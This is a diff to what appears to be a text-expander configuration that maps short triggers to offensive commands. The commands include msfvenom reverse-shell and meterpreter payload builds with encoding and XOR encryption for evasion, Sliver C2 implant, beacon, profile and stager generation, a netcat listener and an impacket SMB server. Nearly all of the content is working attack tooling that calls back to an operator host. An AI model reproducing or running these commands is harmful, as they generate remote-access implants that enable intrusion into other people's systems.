@@ -71,10 +71,10 @@ matches:
     replace: msfvenom -p linux/x64/meterpreter_reverse_tcp LPORT=443 -f elf -o shell.elf -e x64/zutto_dekiru LHOST=
   
   - trigger: ":msfsliver"
-    replace: msfvenom -a x64 -p windows/x64/custom/reverse_winhttp LHOST=tun0 LPORT=8443 LURI=/payload.woff -f exe -e x64/zutto_dekiru -o sliverstage.exe EXITFUNC=thread
+    replace: msfvenom -a x64 -p windows/x64/custom/reverse_winhttp LHOST=tun0 LPORT=8443 LURI=/payload.woff -f exe -o sliverstage.exe EXITFUNC=thread
 
   - trigger: ":msfxor"
-    replace: msfvenom -p windows/x64/custom/reverse_winhttp LHOST=tun0 LPORT=8443 EXITFUNC=thread LURI=/payload.woff -e x64/zutto_dekiru -f csharp --encrypt xor --encrypt-key z -i 20 | tr -d '\n\r'
+    replace: msfvenom -p windows/x64/custom/reverse_winhttp LHOST=tun0 LPORT=8443 EXITFUNC=thread LURI=/payload.woff -f csharp --encrypt xor --encrypt-key z -i 20 | tr -d '\n\r'
     
   - trigger: ":smb"
     replace: impacket-smbserver -smb2support share .
@@ -91,25 +91,31 @@ matches:
   - trigger: ":nc"
     replace: nc -nvlp 443
     
-  - trigger: ":sliver64profile"
-    replace: profiles new -e --mtls {{IP}}:443 --format shellcode -o windows  win-shellcode
+  - trigger: ":sliver64prof"
+    replace: profiles new -e --mtls {{IP}}:443 --format shellcode -o windows shellcode-win
   
-  - trigger: ":sliver32profile"
-    replace: profiles new -e -a 386 --mtls {{IP}}:443 --format shellcode -o windows win-shellcodex86
+  - trigger: ":sliver32prof"
+    replace: profiles new -e -a 386 --mtls {{IP}}:443 --format shellcode -o windows shellcode-winx86
 
   - trigger: ":sliverstage"
-    replace: stage-listener --url http://{{IP}}:8443 --prepend-size --profile win-shellcode
+    replace: stage-listener --url http://{{IP}}:8443 --prepend-size --profile shellcode-
 
-  - trigger: ":sliverdllgens"
+  - trigger: ":sliverwindlls"
     replace: generate -e -f shared -m {{IP}}:443 -R
-
-  - trigger: ":sliverexegens"
+  
+  - trigger: ":sliverwinexes"
     replace: generate -e -f exe -m {{IP}}:443
 
-  - trigger: ":sliverdllgenb"
+  - trigger: ":sliverlinexe"
+    replace: generate  -e --mtls {{IP}}:443 -f exe -o linux 
+
+  - trigger: ":sliverlindll"
+    replace: generate  -e --mtls {{IP}}:443 -f shared -o linux shellcode-lin -R
+  
+  - trigger: ":sliverwindllb"
     replace: generate beacon -e -f shared -S 23 -J 13 -R -m {{IP}}:443
     
-  - trigger: ":sliverexegenb"
+  - trigger: ":sliverwinexeb"
     replace: generate beacon -e -f exe -S 23 -J 13 -m {{IP}}:443  
     
 # ENUMERATION
